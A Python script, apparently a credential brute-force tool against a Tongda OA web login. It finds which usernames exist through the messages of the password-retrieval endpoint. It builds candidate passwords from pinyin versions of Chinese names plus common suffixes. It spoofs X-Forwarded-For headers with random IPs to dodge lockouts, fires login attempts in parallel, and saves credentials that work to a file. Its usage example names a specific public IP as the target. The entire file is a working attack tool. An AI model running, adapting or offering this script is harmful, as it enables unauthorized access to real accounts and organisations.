# -*- coding: UTF-8 -*-
import os,sys,requests,random,urllib
from pypinyin import lazy_pinyin
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from multiprocessing import Pool

from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

def random_ip():
    return "%s.%s.%s.%s" % (random.randint(1,255), random.randint(1,255), random.randint(1,255), random.randint(1,255))

def getListFromFile(filename):
    handler = open(filename, 'r')
    return handler.readlines()

def getUserPassword(username):
    result = []
    username = username.strip()
    # 把汉字转化为拼音
    pinyin_username = []
    usernames = lazy_pinyin(username)
    if len(usernames) == 0:
        return result
    # 
    if usernames[0] == username:
        pinyin_username.append(username)
    else:
        # 全拼音混合
        pinyin_username.append("".join(usernames))
        # 首字母组合
        tmp = ""
        for tmp_name in usernames:
            if(len(tmp_name)) > 0:
                tmp += tmp_name[0]
        pinyin_username.append(tmp)


    for username in pinyin_username:
        if not username:
            return result
        for t in ['111', '123', '1234', '12345', '123456', '888', '000', '2020', '2021', '2022', '@2020', '@2021', '@2022']:
            result.append(username + t)
    return result

def try_login(username, password):
    target = sys.argv[1]
    username = username.strip()
    password = password.strip()
    try:
        # print({"UNAME":username, "PASSWORD":password, "encode_type":"0"})
        with requests.Session() as s:
            retries = Retry(
                total=3,
                backoff_factor=0.2,
                status_forcelist=[500, 502, 503, 504])

            s.mount('http://', HTTPAdapter(max_retries=retries))
            s.mount('https://', HTTPAdapter(max_retries=retries))

            res = s.post(target + "/logincheck.php", 
                data={"UNAME":username.encode("gbk"), "PASSWORD":password, "encode_type":"0"}
                ,headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "X-Forwarded-For": random_ip()
                }
                ,verify=False, timeout=5, allow_redirects=False)
            if "general/index.php" in res.text:
                with open('valid_account.txt', 'a') as w:
                    w.write(username + ":" +password + "\n")
                print("success! username:%s, password:%s" % (username, password))
                # print(username, password)
                return True
    except Exception as e:
        print(e)
    return False

def check_username(username):
    target = sys.argv[1]
    try:
        # print({"UNAME":username, "PASSWORD":password, "encode_type":"0"})
        res = requests.get(target + "/ispirit/retrieve_pwd.php?username=" + urllib.parse.quote(username.encode("gbk"))
            ,verify=False, timeout=5, allow_redirects=False)
        
        if u"用户不存在" in res.text:
            return False
        elif u"电子邮件外发默认邮箱" in res.text:
            return True
        elif u"条件不符" in res.text:
            return True
        else:
            print('interface error', username)
    except Exception as e:
        print(e)
    return False

if __name__ == '__main__':
    # print(getUserPassword('maxinjian'))
    # sys.exit()
    if len(sys.argv) < 2:
        print('Usage: \ncrack.py http://60.165.35.141:8000/\ncrack.py http://60.165.35.141:8000/ username')
        sys.exit()
    if not os.path.isfile('passwords.txt'):
        print('passwords.txt is needed.')
        sys.exit()
    if len(sys.argv) == 2 and not os.path.isfile('usernames.txt'):
        print('usernames.txt is needed.')
        sys.exit()

    #指定用户名，或者自动识别系统存在的用户名
    usernames = []
    if len(sys.argv) > 2:
        if ',' in sys.argv[2]:
            for t in sys.argv[2].split(","):
                t = t.strip()
                if t not in usernames:
                    usernames.append(t)
        else:
            usernames = [sys.argv[2].strip()]
    else:
        for t in getListFromFile('usernames.txt'):
            t = t.strip()
            if t not in usernames and check_username(t): 
                print("Found valid username:" + t)
                usernames.append(t)

    if len(usernames) == 0:
        print('Not find one valid username.please check.')
        sys.exit()
    is_continue = input('Try to find the exists user\'s password(Y/n): ')
    if is_continue.strip().lower() == 'n':
        sys.exit()
    process_num = input('Process number to run(default 5): ')
    try:
        process_num = int(process_num)
        if process_num < 1 or process_num > 50:
            process_num = 5
    except:
        process_num = 5

    #爆破用户对应的密码
    print('start password crack with %s process' % (process_num, ))

    process_pool = Pool(process_num)
    for username in usernames:
        for password in getListFromFile('passwords.txt') + getUserPassword(username):
            process_pool.apply_async(try_login, (username.strip(), password.strip(), ))

    process_pool.close()
    process_pool.join()